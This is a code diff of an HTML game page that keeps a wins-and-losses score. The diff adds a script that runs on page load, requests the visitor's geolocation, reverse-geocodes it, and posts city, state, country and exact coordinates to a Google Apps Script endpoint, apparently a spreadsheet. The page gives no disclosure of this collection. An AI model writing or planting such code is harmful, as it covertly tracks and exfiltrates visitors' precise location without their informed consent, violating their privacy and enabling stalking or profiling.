@@ -4,31 +4,6 @@
   <!-- Google tag (gtag.js) -->
 <script async src="https://www.googletagmanager.com/gtag/js?id=G-X02TNXZZSE"></script>
 <script>
-  function sendLocationToSheet(latitude, longitude) {
-    fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${latitude}&lon=${longitude}`)
-    .then(response => response.json())
-    .then(locationData => {
-        const data = {
-            city: locationData.address.city || locationData.address.town || locationData.address.village || "",
-            state: locationData.address.state || "",
-            country: locationData.address.country || "",
-            latitude: latitude,
-            longitude: longitude
-        };
-
-        fetch('https://script.google.com/macros/s/AKfycbxUSOxJgfCCP1tYcYnSq7DhS2fJaQkaqXTCne-WAFMYTG-kngXW8Tod0E17VAPldd-8-A/exec', {  // Replace with your actual Web App URL
-            method: "POST",
-            body: JSON.stringify(data),
-            headers: {
-                "Content-Type": "application/json"
-            }
-        }).then(response => console.log("Location sent to sheet!"));
-    })
-    .catch(err => console.error(err));
-}
-
-</script>
-<script>
   window.dataLayer = window.dataLayer || [];
   function gtag(){dataLayer.push(arguments);}
   gtag('js', new Date());
@@ -103,7 +78,46 @@
 
       document.getElementById('score').innerHTML = `Wins: ${wins} | Losses: ${losses}`;
     }
+
+     // Collect Location and Send to Google Sheets
+  function getLocationAndSend() {
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(function(position) {
+        const latitude = position.coords.latitude;
+        const longitude = position.coords.longitude;
+
+        // Reverse Geocode to get City, State, Country
+        fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${latitude}&lon=${longitude}`)
+        .then(response => response.json())
+        .then(locationData => {
+            const data = {
+                city: locationData.address.city || locationData.address.town || locationData.address.village || "",
+                state: locationData.address.state || "",
+                country: locationData.address.country || "",
+                latitude: latitude,
+                longitude: longitude
+            };
+
+            // Send data to Google Sheets via Apps Script Web App
+            fetch('https://script.google.com/macros/s/AKfycbxTG2jL5fYIkZd00aaaD2UU1yG1l_AI7yOZW5-Z7wC3LL_us1YFCwqvMVDZanx2RnMSIw/exec', { // Replace this
+                method: "POST",
+                body: JSON.stringify(data),
+                headers: { "Content-Type": "application/json" }
+            })
+            .then(response => console.log("Location data sent successfully!"))
+            .catch(err => console.error("Error sending location:", err));
+        });
+      });
+    } else {
+      alert("Geolocation is not supported by this browser.");
+    }
+  }
+
+  // Trigger location sending on page load
+  window.onload = getLocationAndSend;
+
   </script>
+  
  
   <p style="text-align:center; margin-top:20px; color:gray; font-size:14px;">
   Developed by Sai Krishna Reddy
